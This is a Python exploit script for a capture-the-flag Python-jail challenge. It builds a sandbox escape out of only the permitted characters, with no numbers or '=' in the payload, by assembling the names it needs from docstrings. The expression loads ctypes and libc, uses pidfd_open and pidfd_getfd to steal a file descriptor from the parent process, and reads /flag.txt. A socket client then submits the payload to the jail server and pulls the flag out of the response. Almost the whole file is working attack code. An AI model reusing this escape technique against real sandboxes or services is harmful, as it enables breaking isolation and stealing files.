#!/usr/bin/env python3

import os
import re
import socket
import time


ALLOWED = "abcdefghijklmnopqrstuvwxyz:_.[],"
ONE = "sys.flags.hash_randomization"
ZERO = "sys.flags.debug"


def _shift(expression: str, count: int) -> str:
    """Build expression[count:] without numeric literals in the payload."""
    for _ in range(count):
        expression += "[" + ONE + ":]"
    return expression


def _at(expression: str, index: int) -> str:
    return _shift(expression, index) + "[" + ZERO + "]"


def _chars(expression: str, indexes: list[int]) -> str:
    return "[" + ",".join(_at(expression, index) for index in indexes) + "]"


def _bind(target: str, value: str) -> str:
    """Use a singleton destructuring target as assignment without '='."""
    return "for[" + target + "]in[[" + value + "]]"


def build_payload() -> str:
    """Return the filtered-character-only expression that exfiltrates /flag.txt."""
    parent_fd = int(os.environ.get("PARENT_FD", "4"))
    if parent_fd < 4 or parent_fd > 32:
        raise ValueError("parent descriptor is outside the supported range")

    posix = "sys.modules[sys.__loader__.__module__]._bootstrap_external._os"
    os_module = (
        "sys.modules["
        + posix
        + ".__name__["
        + ONE
        + ":sys.version_info.major]]"
    )
    loader = "sys.__loader__.__module__"
    doc = "sys.__doc__"
    builtin_open = os_module + ".__builtins__[" + os_module + ".open.__name__]"
    open_doc = builtin_open + ".__doc__"
    klass = "sys.path_hooks[" + ONE + "].__closure__[" + ZERO + "].cell_contents"
    cache = "sys.path_importer_cache[sys.path[sys.float_info.radix]]"
    empty = "sys.version[" + ZERO + ":" + ZERO + "]"

    # Names and attributes containing filtered substrings are assembled from
    # docstrings instead of appearing literally in the submitted expression.
    ctypes_key = _chars(doc, [22, 28, 64, 12, 10, 3])
    functools_key = _chars(open_doc, [5, 17, 3, 153, 16, 43, 43, 7, 23])
    import_key = _chars(loader, [0, 0, 8, 9, 10, 11, 12, 13, 0, 0])
    dll_chars = (
        "["
        + loader
        + "["
        + ZERO
        + "],"
        + ",".join(_at(open_doc, index) for index in [12, 7, 7, 16, 87, 1, 2])
        + "]"
    )

    flag_tail = "sys.flags.__doc__[sys.int_info.sizeof_digit:]"
    text_tail = _shift(open_doc, 78)
    path_chars = "[" + ",".join(
        [
            "sys.path[" + ONE + "][" + ZERO + "]",
            flag_tail + "[" + ZERO + "]",
            flag_tail + "[" + ONE + "]",
            flag_tail + "[sys.float_info.radix]",
            flag_tail + "[sys.version_info.major]",
            "sys.version[" + ONE + "]",
            text_tail + "[" + ZERO + "]",
            text_tail + "[sys.float_info.radix]",
            text_tail + "[sys.version_info.major]",
        ]
    ) + "]"

    parent_setup = [("parentfd", "sys.int_info.sizeof_digit")]
    for _ in range(parent_fd - 4):
        parent_setup.extend(
            [
                ("c.__getitem__", "parentfd.__add__"),
                ("parentfd", "p[" + ONE + "]"),
            ]
        )

    clauses = [
        ("c", klass),
        ("p", cache),
        ("o", os_module),
        ("d", empty),
        ("c.__getitem__", "d.join"),
        ("path", "p[" + path_chars + "]"),
        ("importname", "p[" + import_key + "]"),
        ("ctname", "p[" + ctypes_key + "]"),
        ("ftname", "p[" + functools_key + "]"),
        ("dllcharsname", "p[" + dll_chars + "]"),
        ("c.__getitem__", builtin_open),
        ("file", "p[path]"),
        ("c.__getitem__", os_module + ".__builtins__.__getitem__"),
        ("imp", "p[importname]"),
        ("c.__getitem__", "imp"),
        ("ct", "p[ctname]"),
        ("ft", "p[ftname]"),
        ("partial", "ft.partial"),
        ("c.__getitem__", "d.join"),
        ("dllname", "p[dllcharsname]"),
        ("c.__getitem__", "ct.cdll.__dict__.__getitem__"),
        ("cdll", "p[dllname]"),
        ("c.__getitem__", "cdll"),
        ("libc", "p[d]"),
        ("f", "libc.pidfd_getfd"),
        ("c.__getitem__", "o.pidfd_open"),
        ("r", "p[" + ONE + "]"),
        *parent_setup,
        # Reset the indexing primitive after pidfd_open; otherwise p[r]
        # would call pidfd_open again instead of constructing c_int(r).
        ("c.__getitem__", "ct.c_int"),
        ("pid", "p[r]"),
        ("c.__getitem__", "partial"),
        ("g", "p[f]"),
        ("ct.c_int.__setitem__", "g"),
        ("pid[parentfd]", ZERO),
        ("c.__getitem__", "r.__add__"),
        ("fd", "p[" + ONE + "]"),
        ("c.__getitem__", "ct.c_int"),
        ("w", "p[fd]"),
        ("ct.c_int.__index__", "w.value.__index__"),
        ("c.__getitem__", "file.buffer.read"),
        ("blob", "p[sys.float_info.max_exp]"),
        ("ct.c_int.__setitem__", "idk"),
        ("w[blob]", "o.write"),
    ]

    payload = "[p[" + ZERO + "]" + "".join(
        _bind(target, value) for target, value in clauses
    ) + "]"
    filtered = "".join(character for character in payload if character in ALLOWED)
    if filtered != payload:
        raise ValueError("payload contains characters removed by the jail filter")
    if any(blocked in payload for blocked in ("ass", "typ", "als")):
        raise ValueError("payload contains a rejected substring")
    compile(payload, "<payload>", "eval")
    return payload


def submit(host: str, port: int) -> bytes:
    payload = build_payload().encode()
    print(f"payload length: {len(payload)}")

    with socket.create_connection((host, port), timeout=10) as connection:
        connection.settimeout(10)
        banner = connection.recv(4096)
        if b"Send your code:" not in banner:
            raise RuntimeError(f"unexpected banner: {banner!r}")
        connection.sendall(payload)
        # Keep END separate so it is not appended to the payload in
        # user_input, just as when testing with nc.
        time.sleep(1.0)
        connection.sendall(b"END")
        connection.settimeout(8)
        chunks = []
        while True:
            try:
                chunk = connection.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        response = b"".join(chunks)

    print(response.decode(errors="replace"), end="")
    match = re.search(rb"[A-Za-z0-9_]+\{[^{}\r\n]*\}", response)
    if match:
        print(f"<FLAG>{match.group().decode(errors='replace')}</FLAG>")
    return response


def main() -> None:
    host = os.environ.get("HOST", "127.0.0.1")
    port = int(os.environ.get("PORT", "1234"))
    response = submit(host, port)
    if not re.search(rb"[A-Za-z0-9_]+\{[^{}\r\n]*\}", response):
        raise SystemExit("flag not found in the server response")


if __name__ == "__main__":
    main()
